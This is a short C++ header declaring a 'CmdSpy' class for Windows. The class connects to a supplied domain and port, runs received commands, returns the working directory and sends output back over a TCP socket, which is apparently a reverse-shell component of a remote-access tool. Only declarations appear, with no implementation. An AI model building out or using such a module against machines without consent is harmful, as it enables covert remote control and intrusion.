#ifndef CMDSPY_H
#define CMDSPY_H

#include "tcpsocket.h"
#include <windows.h>
#include <iostream>

class CmdSpy
{
public:
    CmdSpy();
    ~CmdSpy();

     std::string CmdPwd;

     std::string CmdSplit;
     std::string CmdEnd;

    static void startByNewThread(std::string domain, int port);
    static DWORD WINAPI threadProc(LPVOID args);
    static void startCmdSpy(std::string domain, int port);
    static void addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size);

    static std::string execCmd(std::string cmd);
    static std::string getPWD();
};

#endif // CMDSPY_H
